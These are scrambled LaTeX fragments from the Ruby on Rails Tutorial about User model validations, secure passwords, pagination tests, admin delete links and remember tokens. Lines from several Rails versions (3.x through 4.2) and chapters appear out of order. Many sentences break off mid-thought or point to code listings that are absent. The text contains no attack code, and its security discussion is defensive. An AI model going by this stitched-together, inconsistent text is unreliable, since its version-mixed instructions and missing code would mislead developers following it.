(I've taken the liberty of associating the first few sample addresses with photos so that they're not all the default Gravatar image.)
In this vein, it might make you unhappy to write
The user index page \href{http://localhost:3000/users}{/users} with 100 sample users.~\href{http://railstutorial.org/images/figures/user_index_all_bootstrap-full.png}{(full size)}
in a bunch of places, when what you really want is to indicate that the page should have an error message.
This practice couples the test tightly to the implementation, and we would have to change it everywhere if the implementation changed.
In the context of pure RSpec, there is a solution, which is to use a \emph{custom matcher}, allowing us to write the following instead:
The code itself looks like this:
We can also define helper functions for common operations:
I find this approach to be more flexible than Cucumber step definitions, particularly when the matchers or should helpers naturally take an argument, such as \kode{valid\_signin(user)}.
Because the \texttt{will\_paginate} gem is in wide use, there's no need to test it thoroughly, so we'll take a lightweight approach.
Step definitions can replicate this functionality with regex matchers, but I generally find this approach to be more (cu)cumbersome.
First, we'll test for a \kode{div} with CSS class ``pagination'', which is what gets output by \texttt{will\_paginate}.
Adding a helper method and a custom RSpec matcher.
Then we'll verify that the correct users appear on the first page of results.
This requires the use of the \kode{paginate} method, which we'll cover shortly.
There are many other examples of coupling between our tests and the site's implementation.
As before, we'll use Factory Girl to simulate users, but immediately we have a problem: user email addresses must be unique, which would appear to require creating more than 30 users by hand---a terribly cumbersome job.
In addition, when testing for user listings it would be convenient for them all to have different names.
We've covered a lot of ground in this chapter, transforming our promising but unformed application into a site capable of the full suite of registration and login behaviors.
Fortunately, Factory Girl anticipates this issue, and provides \emph{sequences} to solve it.
All that is needed to complete the authentication functionality is to restrict access to pages based on signin status and user identity.
Then push up the remote GitHub repository and the Heroku production server:
Refactor the signin form to use \kode{form\_tag} in place of \kode{form\_for}.
Instead, we can arrange for a sequence of names and email addresses using the \kode{sequence} method:
Make sure the test suite still passes.
Here \kode{sequence} takes a symbol corresponding to the desired attribute (such as \kode{:name}) and a block with one variable, which we have called~\kode{n}.
\emph{Hint}: See the \href{http://railscasts.com/episodes/270-authentication-in-rails-3-1}{RailsCast on authentication in Rails~3.1}, and note in particular the change in the structure of the \kode{params} hash.
Upon successive invocations of the \kode{FactoryGirl} method,
\emph{Extra credit:} Organize the support code into separate files and modules, and get everything to work by including the modules properly in the spec helper file.
in Listing~\ref{code:factory_sequence}.
Defining a Factory Girl sequence.
Applying the idea of factory sequences, we can make 30 users in our test, which (as we will see) will be sufficient to invoke pagination:
Note here the use of \kode{before(:all)}, which ensures that the sample users are created \emph{once}, before all the tests in the block.
This is an optimization for speed, as creating 30 users can be slow on some systems.
We use the complementary method \kode{after(:all)} to delete the users once we're done.
in Listing~\ref{code:will_paginate_test}.
Tests for pagination.
The user index page  \href{http://localhost:3000/users}{/users} with pagination.~\href{http://railstutorial.org/images/figures/user_index_pagination_rails_3_bootstrap-full.png}{(full size)}
You should also verify that the tests are passing:
The first refactoring attempt at the index view.
As with any refactoring, you should verify that the test suite is still green after changing the application code:
But first, we'll create the class of administrative users authorized to do so.
A mockup of the user index with delete links.~\href{http://railstutorial.org/images/figures/user_index_delete_links_mockup_bootstrap-full.png}{(full size)}
We will identify privileged administrative users with a boolean \kode{admin} attribute in the User model, which, as we'll see, will automatically lead to an \kode{admin?}\ boolean method to test for admin status.
in Listing~\ref{code:admin_specs}.
Tests for an \kode{admin} attribute.
Also note that the line
implies (via the RSpec boolean convention) that the user should have an \kode{admin?}\ boolean method.
As a result, the admin tests should pass:
The sample data populator code with an admin user.
Then reset the database and re-populate the sample data:
To write tests for the delete functionality, it's helpful to be able to have a factory to create admins.
as shown in Listing~\ref{code:admin_factory}.
Adding a factory for administrative users.
Our security model requires that ordinary users not see delete links:
But administrative users should see such links, and by clicking on a delete link we expect an admin to delete the user, i.e., to change the \kode{User} count by~\kode{-1}:
This includes the code \kode{match: :first}, which tells Capybara that we don't care \emph{which} delete link it clicks; it should just click the first one it sees.
Note also that we have added a test to verify that the admin does not see a link to delete himself.
in Listing~\ref{code:delete_link_tests}.
Tests for delete links.
The user index \href{http://localhost:3000/users}{/users} with delete links.~\href{http://railstutorial.org/images/figures/index_delete_links_rails_3_bootstrap-full.png}{(full size)}
Note that we also add \kode{:destroy} to the \kode{signed\_in\_user} before filter.
To secure the site properly, we also need access control on the \kode{destroy} action, so our tests should check not only that admins \emph{can} delete users, but also that other users \emph{can't}.
The results appear in Listing~\ref{code:delete_destroy_test}.
A test for protecting the \kode{destroy} action.
In principle, there's still a minor security hole, which is that an admin could delete himself by issuing a \texttt{DELETE} request directly.
As you might suspect by now, the application code uses a before filter, this time to restrict access to the \kode{destroy} action to admins.
At this point, all the tests should be passing, and the Users resource---with its controller, model, and views---is functionally complete.
Those users couldn't even sign up; now users can sign up, sign in, sign out, view their profiles, edit their settings, and see an index of all users---and some can even destroy other users.
These chapters will introduce some of the most powerful features of Rails, including data modeling with \kode{has\_many} and \kode{has\_many through}.
(Optional gems may be system-dependent and are commented out.
You can uncomment them to see if they work on your system.)
# The following optional lines are part of the advanced setup.
# gem 'guard-rspec', '2.5.0'
# gem 'guard-spork', '1.5.0'
# gem 'childprocess', '0.3.6'
# gem 'win32console', '1.3.2'
Be sure to get first to Red, and then to Green.
(\emph{Hint}: Your first step should be to \emph{add} \kode{admin} to the list of permitted parameters in \kode{user\_params}.)
The current authentication tests check that navigation links such as ``Profile'' and ``Settings'' appear when a user is signed in.
Add tests to make sure that these links \emph{don't} appear when a user isn't signed in.
You will also have to update the tests, as the forms aren't currently \emph{exactly} the same; identify the slight difference and update the tests accordingly.
Write a test to make sure that the friendly forwarding only forwards to the given URL the first time.
On subsequent signin attempts, the forwarding URL should revert to the default (i.e., the profile page).
The new user view with partial.
A test for forwarding to the default page after friendly forwarding.
<n>            end
We also test that the error message contains the text \kode{"Invalid"}.
Putting these together, the test looks for an element of the following form:
Our plan is to store the base64 token on the browser, and then store an encrypted version in the database.
We can then sign users in automatically by retrieving the token from the cookie, encrypting it, and then searching for a remember token matching the encrypted value.
The reason for storing only encrypted tokens is so that, even if our entire database is compromised, the attacker still won't be able to use the remember tokens to sign in.
For more details on the kind of callbacks supported by Active Record, see the \href{http://guides.rubyonrails.org/v3.1.23/active_record_validations_callbacks.html}{discussion of callbacks at the Rails Guides}.
Since the encrypted \kode{SecureRandom.urlsafe\_base64} string is definitely \emph{not} blank, the tests for the User model should now be passing:
Note that, because the remember token in the database is encrypted, we first need to encrypt the token from the cookie before using it to find the user in the database.
In the process of putting the new links into the layout, we'll take advantage of Bootstrap's ability to make dropdown menus, which you can read more about on the \href{http://twitter.github.com/bootstrap/components.html}{Bootstrap components page}.
Moreover, this subset is \emph{different} from the usual approaches to learning Ruby, which is why, if your goal is making dynamic web applications, I recommend learning Rails first, picking up bits of Ruby along the way.
To become a Rails \emph{expert}, you need to understand Ruby more deeply, and this book gives you a good foundation for developing that expertise.
If a helper is specific to a particular controller, you should put it in the corresponding helper file; for example, helpers for the StaticPages controller generally go in \kode{app/helpers/static\_pages\_helper.rb}.
Updated tests for the Home page's title.
See if you can figure out why we've added a new test instead of just altering the current one.
Note that Ruby functions have an \emph{implicit return}, meaning they return the last statement evaluated---in this case, one of the two message strings, depending on whether the method's argument \kode{string} is empty or not.
These sorts of hashes-of-hashes, or \emph{nested hashes}, are heavily used by Rails, as we'll see starting in Section~\ref{sec:signup_failure}.
For example, consider a hash named \kode{flash} with keys for two conditions, \kode{:success} and \kode{:error}:
=> {:success=>"It worked!", :error=>"It failed."}
Finally, this data model is a maintainability nightmare: each time a user changed (say) his name, we would need to update not just the user's record in the \kode{users} table but also \emph{every row containing that user}<n>in both the \kode{followed\_users} and \kode{followers} tables.
would try to create the symbol \kode{:data-turbolinks-track}, which (it turns out) is invalid because of the hyphens.
This example assumes you are using Ruby~1.9.3.
The inheritance hierarchy for the StaticPages controller.
Taken together, the material in Chapter~\ref{cha:modeling_users} through Chapter~\ref{cha:updating_showing_and_deleting_users} develops a full Rails login and authentication system.
This is a long and action-packed chapter, and you may find it unusually challenging, especially if you are new to data modeling.
By the end of it, though, we will have created an industrial-strength system for validating, storing, and retrieving user information.
By using an email address as the username, we open the theoretical possibility of communicating with our users at a future date.
By naming the columns in this way, we'll let Active Record figure out the User object attributes for us.
Let's see how this works.
There is an analogous command for making a model: \kode{generate model}.
      create    db/migrate/[timestamp]_create_users.rb
      invoke    rspec
      create      spec/models/user_spec.rb
(Note that, in contrast to the plural convention for controller names, model names are singular: a Users controller, but a User model.)
By passing the optional parameters \kode{name:string} and \kode{email:string}, we tell Rails about the two attributes we want, along with what types those attributes should be (in this case, \kode{string}).
The  \href{http://sqlitebrowser.sourceforge.net/}{SQLite Database Browser} with our new \kode{users} table.~\href{http://railstutorial.org/images/figures/sqlite_database_browser-full.png}{(full size)}
Most migrations, including all the ones in the \emph{Rails Tutorial}, are \emph{reversible}, which means we can ``migrate down'' and undo them with a single Rake task, called \kode{db:rollback}:
Before we move on, though, there are two tasks to complete.
Model annotation
Adding the \kode{annotate} gem to the \kode{Gemfile}.
(We place the \kode{annotate} gem in a \kode{group :development} block (analogous to \kode{group :test}) because the annotations aren't needed in production applications.)
We next install it with \kode{bundle install}:
This gives us a command called \kode{annotate}, which simply adds comments containing the data model to the model file:
Annotated (1): User
The results appear in Listing~\ref{code:annotated_user_model}.
The annotated User model.
# == Schema Information
# Table name: users
#  id         :integer         not null, primary key
#  name       :string(255)
#  email      :string(255)
#  created_at :datetime
#  updated_at :datetime
I find that having the data model visible in the model files helps remind me which attributes the model has, but future code listings will omit the annotations for brevity.
(Note that, if you want your annotations to be up-to-date, you'll have to run \kode{annotate} again any time the data model changes.)
Accessible attributes
This line tells Rails which attributes of the model are \emph{accessible}, i.e., which attributes can be modified automatically by outside users (such as users submitting requests with web browsers).
Making the \kode{name} and \kode{email} attributes accessible.
By default, \emph{all} model attributes are accessible.
If you've been tailing the development log, you may have noticed that no new lines have shown up yet.
This is because calling \kode{User.new} doesn't touch the database; it simply creates a new Ruby object in memory.
To save the user object to the database, we call the \kode{save} method on the \kode{user} variable:
Because of the many methods supplied by Active Record, we won't ever need raw SQL in this book, and I'll omit discussion of the SQL commands from now on.
created_at: "2013-03-11 00:57:46", updated_at: "2013-03-11 00:57:46">
In case you're curious about \kode{"2013-03-11 00:57:46"}, I'm not writing this after midnight; the timestamps are recorded in \href{http://en.wikipedia.org/wiki/Coordinated_Universal_Time}{Coordinated Universal Time} (UTC), which for most practical purposes is the same as \href{http://en.wikipedia.org/wiki/Greenwich_Mean_Time}{Greenwich Mean Time}.
Note the value of \kode{user.updated\_at}.
"2013-03-11 01:05:24", updated_at: "2013-03-11 01:05:24">
#<User id: 3, name: "Foo", email: "foo@bar.com", created_at: "2013-03-11
01:05:42", updated_at: "2013-03-11 01:05:42">
Oddly, \kode{destroy}, like \kode{create}, returns the object in question, though I can't recall ever having used the return value of \kode{destroy}.
Even odder, perhaps, is that the \kode{destroy}ed object still exists in memory:
How do we know if we really destroyed an object?
It's time to learn how to use Active Record to find user objects.
The \kode{find\_by\_email} method is automatically created by Active Record based on the \kode{email} attribute in the \kode{users} table.
(As you might guess, Active Record creates a \kode{find\_by\_name} method as well.)
Starting in Rails~4.0, the preferred method to find by attribute is to use the \kode{find\_by} method instead, passing the attribute as a hash:
created_at: "2013-03-11 00:57:46", updated_at: "2013-03-11 00:57:46">,
"2013-03-11 01:05:24", updated_at: "2013-03-11 01:05:24">]
=> "2013-03-11 00:57:46"
=> "2013-03-11 01:37:32"
Moreover, since we'll be using email addresses as unique usernames when users sign in, we shouldn't allow email duplicates in the database.
Active Record allows us to impose such constraints using \emph{validations}.
And we'll see in Section~\ref{sec:signup_failure} how validations give us convenient error messages when users make submissions that violate them.
As with the other features of our sample app, we'll add User model validations using test-driven development.
Because we didn't pass the
The practically blank default User spec.
This simply uses the \kode{pending} method to indicate that we should fill the spec with something useful.
We can see its effect by preparing a (blank) test database and running the User model spec:
Finished in 0.01999 seconds
1 example, 0 failures, 1 pending
Pending:
<n>  User add some examples to (or delete)
<n>  /Users/mhartl/rails_projects/sample_app/spec/models/user_spec.rb
<n>  (Not Yet Implemented)
On many systems, pending specs will be displayed in yellow to indicate that they are in between passing (green) and failing (red).
This is the first time we've seen the command to create a test database with the correct structure:
(Failure to run this Rake task after a migration is a common source of confusion.
In addition, sometimes the test database gets corrupted and needs to be reset.
If your test suite is mysteriously breaking, be sure to try running \kode{rake test:prepare} to see if that fixes the problem.)
in Listing~\ref{code:user_spec}.
Testing for the \kode{:name} and \kode{:email} attributes.
The tests themselves rely on the \emph{boolean convention} used by RSpec: the code
can be tested using the RSpec code
These kinds of tests allow us to use TDD to add new attributes and methods to our User model, and as a side-effect we get a nice specification for the methods that all \kode{User} objects should respond to.
Because we have already properly prepared the test database with \kode{rake test:prepare}, the tests should pass:
We'll start with a test for the presence of a \kode{name} attribute.
Then we'll comment out the validation, write a failing test, and verify that uncommenting the validation gets the test to pass.
This procedure may seem pedantic for such a simple test, but I have seen many ``simple'' tests that actually test the wrong thing; being meticulous about TDD is simply the \emph{only} way to be confident that we're testing the right thing.
(This comment-out technique is also useful when rescuing an application whose application code is already written but---\href{http://en.wiktionary.org/wiki/quelle_horreur}{\emph{quelle horreur!}}---has no tests.)
as shown in  Listing~\ref{code:validates_presence_of_name}.
Here \kode{user.save} returns \kode{false}, indicating a failed save.
In the final command, we use the \kode{valid?}\ method, which returns \kode{false} when the object fails one or more validations, and \kode{true} when all validations pass.
Commenting out a validation to ensure a failing test.
# validates :name, presence: true
in Listing~\ref{code:failing_validates_name_spec}.
A failing test for validation of the \kode{name} attribute.
The first new example is just a sanity check, verifying that the subject (\kode{@user}) is initially valid:
In this case, we can test the result of calling
The second test first sets the user's name to an invalid (blank) value, and then tests to see that the resulting \kode{@user} object is invalid:
This uses a \kode{before} block to set the user's name to an invalid (blank) value and then checks that the resulting user object is not valid.
You should verify that the tests fail at this point:
4 examples, 1 failure
4 examples, 0 failures
Of course, we also want to validate the presence of email addresses.
A test for presence of the \kode{email} attribute.
as seen in Listing~\ref{code:validates_presence_of_email}.
Validating the presence of the \kode{name} and \kode{email} attributes.
Now all the tests should pass, and the presence validations are complete.
Our validations for the \kode{name} attribute enforce only minimal constraints---any non-blank name under 51 characters will do---but of course the \kode{email} attribute must satisfy more stringent requirements.
We'll start with a couple tests involving collections of valid and invalid addresses.
=> ["user@foo.
COM A_US-ER@f.b.org frst.lst@foo.jp a+b@baz.cn]
So, where does the pattern come from?
case insensitive
By the way, there actually exists a full regex for matching email addresses according to the official standard, but it's really not worth the trouble.
Did you know that \kode{"Michael Hartl"@example.com}, with quotation marks and a space in the middle, is a valid email address according to the standard?
The expression above does have one weakness, though: it allows invalid addresses such as \kode{foo@bar..com} that contain consecutive dots.
The awesome  \href{http://www.rubular.com/}{Rubular} regular expression editor.~\href{http://railstutorial.org/images/figures/rubular-full.png}{(full size)}
The tests should all be passing now.
(In fact, the tests for valid email addresses should have been passing all along; since regexes are notoriously error-prone, the valid email tests are there mainly as a sanity check on \kode{VALID\_EMAIL\_REGEX}.)
This means that there's only one constraint left: enforcing the email addresses to be unique.
We'll start, as usual, with our tests.
in Listing~\ref{code:validates_uniqueness_of_email_test}.
The method here is to make a user with the same email address as \kode{@user}, which we accomplish using \kode{@user.dup}, which creates a duplicate user with the same attributes. Since we then save that user, the original \kode{@user} has an email address that already exists in the database, and hence should not be valid.
in Listing~\ref{code:validates_uniqueness_of_email}.
Technically, only the domain part of the email address is case-insensitive: foo@bar.com is actually different from Foo@bar.com.
in Listing~\ref{code:validates_uniqueness_of_email_case_insensitive_test}.
A test for the rejection of duplicate email addresses, insensitive to case.
This test does the same thing as the first duplicate email test, but with an upper-case email address instead.
Of course, \kode{user\_with\_same\_email.valid?}\ is \kode{true}, because the uniqueness validation is currently case-sensitive, but we want it to be \kode{false}.
Note that we have simply replaced \kode{true} with \kode{case\_sensitive: false}; Rails infers in this case that \kode{:uniqueness} should be \kode{true}.
At this point, our application---with an important caveat---enforces email uniqueness, and our test suite should pass.
There's just one small problem, the caveat alluded to above:
Using \kode{validates :uniqueness} does not guarantee uniqueness.
But what can go wrong?
Here's what:
If the above sequence seems implausible, believe me, it isn't: it can happen on any Rails website with significant traffic.
Luckily, the solution is straightforward to implement; we just need to enforce uniqueness at the database level as well.
Our method is to create a database \emph{index} on the email column, and then require that the index be unique.
The Rails Way is to use migrations every time we discover that our data model needs to change.
Unfortunately, there's one more change we need to make to be assured of email uniqueness, which is to make sure that the email address is all lower-case before it gets saved to the database.
The reason is that not all database adapters use case-sensitive indices
Direct experimentation with SQLite on my system and PostgreSQL on Heroku show that this step is, in fact, necessary.
The way to do this is with a \href{http://en.wikipedia.org/wiki/Callback_(computer_science)}{\emph{callback}}, which is a method that gets invoked at a particular point in the lifetime of an Active Record object (see the \href{http://api.rubyonrails.org/v4.0.0/classes/ActiveRecord/Callbacks.html}{Rails API entry on callbacks}).
as shown in Listing~\ref{code:email_downcase}.
Now the Alice scenario above will work fine: the database will save a user record based on the first request, and will reject the second save for violating the uniqueness constraint.
(An error will appear in the Rails log, but that doesn't do any harm.
In a book, to find all the occurrences of a given string, say ``foobar'', you would have to scan each page for ``foobar''.
In this section, we'll add the last of the basic User attributes: a secure password used to authenticate users of the sample application.
Much of the secure password machinery will be implemented using a single Rails method called \kode{has\_secure\_password} (first introduced in Rails~3.1).
Because so much of what follows depends on this one method, it is difficult to develop secure passwords incrementally.
(Since screencasts allow for a more incremental development approach, interested readers should consider the \href{http://railstutorial.org/screencasts}{Ruby on Rails Tutorial screencasts} for a fuller understanding of this material.)
On some systems, you may get the warning
make: /usr/bin/gcc-4.2: No such file or directory
To fix this, reinstall RVM using the \kode{clang} flag:
in Listing~\ref{code:respond_to_password_digest}.
Ensuring that a User object has a \kode{password\_digest} column.
To get the test to pass, we first generate an appropriate migration for the \kode{password\_digest} column:
Here the first argument is the migration name, and we've also supplied a second argument with the name and type of attribute we want to create.
in Listing~\ref{code:generate_user_model}.
We can choose any migration name we want, but it's convenient to end the name with \kode{\_to\_users}, since in this case Rails automatically constructs a migration to add columns to the \kode{users} table.
This code uses the \kode{add\_column} method to add a \kode{password\_digest} column to the \kode{users} table.
from Listing~\ref{code:respond_to_password_digest} to
We could enforce this at the controller layer, but it's conventional to put it in the model and use Active Record to enforce the constraint.
The method is to add \kode{password} and \kode{password\_confirmation} attributes to the User model, and then require that the two attributes match before the record is saved to the database.
Unlike the other attributes we've seen so far, the password attributes will be \emph{virtual}---they will only exist temporarily in memory, and will not be persisted to the database.
as seen in Listing~\ref{code:user_respond_to_password}.
Testing for the \kode{password} and \kode{password\_confirmation} attributes.
Note that we've added \kode{:password} and \kode{:password\_confirmation} to the initialization hash for \kode{User.new}:
We definitely don't want users to enter a blank password, so we'll add another test to validate password presence:
Since we'll be testing password mismatch in a moment, here we make sure to test the \emph{presence} validation by setting both the password and its confirmation to a blank string.
We also want to ensure that the password and confirmation match.
in Listing~\ref{code:password_tests}.
Test for the password and password confirmation.
as shown in Listing~\ref{code:initial_passing_password_tests}.
Getting the initial password tests to pass.
gets all of the current password tests to pass, and it does a lot more besides.
Commenting out \kode{has\_secure\_password} for the sake of TDD.
# has_secure_password
The final piece of our password machinery is a method to retrieve users based on their email and passwords.
This divides naturally into two parts: first, find a user by email address; second, authenticate the user with a given password.
The second step is then to use an \kode{authenticate} method to verify that the user has the given password.
If the given password matches the user's password, it should return the user; otherwise, it should return \kode{false}.
As usual, we can express the requirement for \kode{authenticate} using RSpec.
The resulting tests are more advanced than the others we've seen, so let's break them down into pieces; if you're new to RSpec, you might want to read this section a couple of times.
We start by requiring a User object to respond to \kode{authenticate}:
We then cover the two cases of password match and mismatch:
let(:found_user) { User.find_by(email: @user.email) }
The \kode{before} block saves the user to the database so that it can be retrieved using \kode{find\_by}, which we accomplish using the \kode{let} method:
We've used \kode{let} in a couple of exercises, but this is the first time we've seen it in the body of the tutorial.
Note that the tests in
use \kode{let} a second time, and also use the \kode{specify} method.
This is just a synonym for \kode{it}, and can be used when writing \kode{it} would sound unnatural.
Using \texttt{let}
RSpec's \texttt{let} method provides a convenient way to create local variables inside tests.
The syntax might look a little strange, but its effect is similar to variable assignment.
The argument of \texttt{let} is a symbol, and it takes a block whose return value is assigned to a local variable with the symbol's name.
creates a \texttt{found\_user} variable whose value is equal to the result of \texttt{find\_by}.
We can then use this variable in any of the \texttt{before} or \texttt{it} blocks throughout the rest of the test. One advantage of \texttt{let} is that it \emph{memoizes} its value, which means that it remembers the value from one invocation to the next.
(Note that \href{http://en.wikipedia.org/wiki/Memoization}{\emph{memoize}} is a technical term; in particular, it's \emph{not} a misspelling of ``memorize''.)
In the present case, because \texttt{let} memoizes the \texttt{found\_user} variable, the \texttt{find\_by} method will only be called once whenever the User model specs are run.
Finally, as a security precaution, we'll test for a length validation on passwords, requiring that they be at least six characters long:
Tests for password length and the \kode{authenticate} method.
But web developers' understanding of how best to authenticate users has matured enough that it now comes bundled with the latest version of Rails.
As a result, we'll complete the implementation of secure passwords (and get to a green test suite) using only a few lines of code.
(Presence validations for the password and its confirmation are automatically added by \kode{has\_secure\_password}.)
This is the only nontrivial step, and in the latest version of Rails all these features come for free with one method, \kode{has\_secure\_password}:
As long as there is a \kode{password\_digest} column in the database, adding this one method to our model gives us a secure way to create and authenticate new users.
(If you'd like to see how \kode{has\_secure\_password} is implemented, I suggest taking a look at \href{https://github.com/rails/rails/blob/master/activemodel/lib/active_model/secure_password.rb}{the source code for \texttt{secure\_password.rb}}, which is well-documented and quite readable.
That code includes the lines
which (as described in the \href{http://api.rubyonrails.org/v4.0.0/classes/ActiveModel/Validations/HelperMethods.html#method-i-validates_confirmation_of}{Rails API}) automagically creates an attribute called \kode{password\_confirmation}.
It also includes a validation for the \kode{password\_digest} attribute.)
You should confirm at this point that the test suite passes:
This also gives us a chance to make the work from the previous sections feel more concrete; merely getting the test suite to pass may seem anti-climactic, and it will be gratifying to see an actual user record in the development database.
created_at: "2013-03-11 20:45:19", updated_at: "2013-03-11 20:45:19",
password_digest: "$2a$10$kn4cQDJTzV76ZgDxOWk6Je9A0Ttn5sKNaGTEmT0jU7.n..."
A user row in the SQLite database \kode{db/development.sqlite3}.~\href{http://railstutorial.org/images/figures/sqlite_user_row_with_password_4_0-full.png}{(full size)}
=> "$2a$10$kn4cQDJTzV76ZgDxOWk6Je9A0Ttn5sKNaGTEmT0jU7.ncBJ/60gHq"
We can also verify that the \kode{authenticate} command is working by first using an invalid password and then a valid one:
Starting from scratch, in this chapter we created a working User model with \kode{name}, \kode{email}, and various password attributes, together with validations enforcing several important constraints on their values.
In addition, we can securely authenticate users using a given password.
In previous versions of Rails, such a feat would have taken more than twice as much code, but because of the compact \kode{validates} method and \kode{has\_secure\_password}, we were able to build a complete User model using less than a dozen lines of code.
Then merge back into the master branch:
This test uses the \kode{reload} method for reloading a value from the database and the \kode{eq} method for testing equality.
as shown in Listing~\ref{code:downcase_bang}.
Read through the Rails API entry for \kode{ActiveRecord::Base} to get a sense of its capabilities.
Study the entry in the Rails API for the \kode{validates} method to learn more about its capabilities and options.
Spend a couple of hours playing with \href{http://www.rubular.com/}{Rubular}.
The method is to require each user to have a password (with a password confirmation), and then store an encrypted version of the password in the database.
The method for authenticating users will be to take a submitted password, encrypt it, and compare the result to the encrypted value stored in the database.
By comparing encrypted values instead of raw passwords, we will be able to authenticate users without storing the passwords themselves.
We'll use the state-of-the-art hash function called \href{http://en.wikipedia.org/wiki/Bcrypt}{bcrypt} to irreversibly encrypt the password to form the password hash.
Second, we need to add \kode{password} and \kode{password\_confirmation} attributes, require the presence of the password, require that they match, and add an \kode{authenticate} method to compare an encrypted password to the \kode{password\_digest} to authenticate users.
This is the encrypted version of the password (\kode{"foobar"}) used to initialize the user object.
as seen in Listing~\ref{code:hello_world}.
page to show user with id \texttt{1}
page to edit user with id \texttt{1}
update user with id \texttt{1}
delete user with id \texttt{1}
from Listing~\ref{code:hello_root_route} to
It is possible, of course, to arrange for this information to be handled securely (by having Git ignore it, for example), but this is  error-prone and requires significant expertise.
The page is identical to Figure~\ref{fig:hello_world_first_app}, but now it's running in a production environment on the live web.
<n>  $ kill -9 12241
<n>  $ pkill -9 -f spring
Any time something isn't behaving as expected or a process appears to be frozen, it's a good idea to run \texttt{ps aux} to see what's going on, and then run \texttt{kill -9 <pid>} or \texttt{pkill -9 -f <name>} to clear things up.
This is because \kode{rails new} generates single-quoted strings, whereas the \href{https://github.com/kern/minitest-reporters}{MiniTest reporters documentation} uses double-quoted strings.
A partial for the \kode{new} and \kode{edit} form fields.
as seen in Listing~\ref{code:allow_blank_password}.
Note that the \kode{remember\_token} argument in the \kode{authenticated?}\ method defined in Listing~\ref{code:authenticated_p} is not the same as the accessor that we defined in Listing~\ref{code:user_model_remember} using \kode{attr\_accessor :remember\_token}; instead, it is a variable local to the method.
Because we configured Bundler not to install production gems (Section~\ref{sec:sample_app_setup}), Listing~\ref{code:unicorn_gemfile} won't add any gems to the development environment, but we still need to run Bundler to update \kode{Gemfile.lock}:
As seen in Figure~\ref{fig:filled_in_form}, text and email fields (\kode{type="text"} and \kode{type="email"}) simply display their contents, whereas password fields (\kode{type="password"}) obscure the input for security purposes, as seen in Figure~\ref{fig:filled_in_form}.
in Listing~\ref{code:base_title_test}.
See the \href{http://api.rubyonrails.org/v4.2.0.beta4/classes/ActiveRecord/Callbacks.html}{Rails API entry on callbacks} for more information on which callbacks Rails supports.
Solutions Manual for Exercises
The second main way to update multiple attributes is to use \kode{update\_attributes}
As in Listing~\ref{code:email_format_validation_tests}, Listing~\ref{code:email_format_validation_tests} includes a custom error message to identify the exact address causing any failure.
See the \href{http://api.rubyonrails.org/v4.2.0.beta2/classes/ActiveRecord/Callbacks.html}{Rails API entry on callbacks} for more information on which callbacks Rails supports.
as shown in Listing~\ref{code:debugger}.
(Figure~\ref{fig:signup_failure_3rd_edition} also shows the \emph{web console}, which opens a Rails console in the browser to assist in debugging.
In Listing~\ref{code:generating_pages}, note that we have passed the controller name as CamelCase, which leads to the creation of a controller file written in \href{https://en.wikipedia.org/wiki/Snake_case}{snake case}, so that a controller called StaticPages yields a file called \kode{static\_pages\_controller.rb}.
By the way, it's worth noting that \kode{rails g} is a shortcut for \kode{rails generate}, which is only one of several shortcuts supported by Rails (Table~\ref{table:shortcuts}).
Once you've created the \kode{about.html.erb} file in the right directory, you should fill it with the contents shown in Listing~\ref{code:custom_about_page}.
We can put the \kode{log\_out} method to use in the Sessions controller's \kode{destroy} action, as shown in Listing~\ref{code:destroy_session}.
The application code simply involves calling \kode{log\_out} only if \kode{logged\_in?}\ is true, as shown in Listing~\ref{code:destroy_forget}.
in Listing~\ref{code:password_reset_integration_test}.
in Listing~\ref{code:branch_raise}.
in Listing~\ref{code:rails_routes_root_route}.
Note how similar the final step is to logging a user in, where we retrieve the user by email address and then verify (using the \kode{authenticate} method) that the submitted password matches the password digest (Listing~\ref{code:log_in_success}).
in Listing~\ref{code:authenticated_p}.
in Listing~\ref{code:log_in_success}.
in Listing~\ref{code:title_tests} and
  * This is a manifest file that'll automatically include all the stylesheets
  * available in this directory and any sub-directories.
  * application-wide styles to this file and they'll appear at the top of the
  * compiled file, but it's generally better to create a new file per style
  * scope.
  *= require_self
  *= require_tree .
 *= require_tree .
 *= require_self
   User add some examples to (or delete)
   /Users/mhartl/rails_projects/sample_app/spec/models/user_spec.rb
   (Not Yet Implemented)
in Listing~\ref{code:name_presence_test}.
(Since screencasts allow for a more incremental development approach, interested readers should consider the \href{http://www.railstutorial.org/screencasts}{Ruby on Rails Tutorial screencasts} for a fuller understanding of this material.)
which (as described in the \href{http://api.rubyonrails.org/v4.1.5/classes/ActiveModel/Validations/HelperMethods.html#method-i-validates_confirmation_of}{Rails API}) automagically creates an attribute called \kode{password\_confirmation}.
         end
as shown in Listing~\ref{code:microposts_create_action_with_feed}.
As we saw briefly before in the Chapter~\ref{cha:a_demo_app} exercises, the way to validate the presence of the name attribute is to use the \kode{validates} method with argument \kode{presence: true}, as shown in  Listing~\ref{code:validates_presence_of_name}.
See the \href{http://api.rubyonrails.org/v4.1.4/classes/ActiveRecord/Callbacks.html}{Rails API entry on callbacks} for more information on which callbacks Rails supports.
which (as described in the \href{http://api.rubyonrails.org/v4.1.4/classes/ActiveModel/Validations/HelperMethods.html#method-i-validates_confirmation_of}{Rails API}) automagically creates an attribute called \kode{password\_confirmation}.
In Chapter~\ref{cha:sign_in_sign_out}, we'll use the \kode{authenticate} method to sign registered users into our site.
To get started with static pages, we'll first generate a controller using the same Rails \kode{generate} script we used in Chapter~\ref{cha:a_demo_app} to generate scaffolding.
as shown in Listing~\ref{code:adding_the_about_page}.
We'll write simple tests for each of the titles in Table~\ref{table:static_pages} by combining the tests in Listing~\ref{code:about_page_content_spec} with the \kode{assert\_select} method, which lets us test for the presence of a particular HTML tag (sometimes called a ``selector'', hence the name)
from Listing~\ref{code:html_structure} to
 We first saw microposts in larval form in Chapter~\ref{cha:a_demo_app}, and in this chapter we will make a full-strength version of the sketch from Section~\ref{sec:microposts_resource} by constructing the Micropost data model, associating it with the User model using the \kode{has\_many} and \kode{belongs\_to} methods, and then making the forms and partials needed to manipulate and display the results (including, in Section~\ref{sec:microposts_with_images}, uploaded images).
Submitting the \href{http://0.0.0.0:3000/sessions/new}{/sessions/new} form then yields the result shown in Figure~\ref{fig:initial_failed_signin_rails_3}.
Of course, this simplicity is a sign of being \emph{more} advanced, not less---we've come a long way since our reliance on scaffolding in Chapter~\ref{cha:a_demo_app}, and we no longer need most of its complexity.
Carefully inspecting the debug information in Figure~\ref{fig:initial_failed_signin_rails_3} shows that, as hinted at the end of Section~\ref{sec:signin_form}, the submission results in a \kode{params} hash containing the email and password under the key \kode{session}, which (omitting some irrelevant details used internally by Rails) appears as follows:
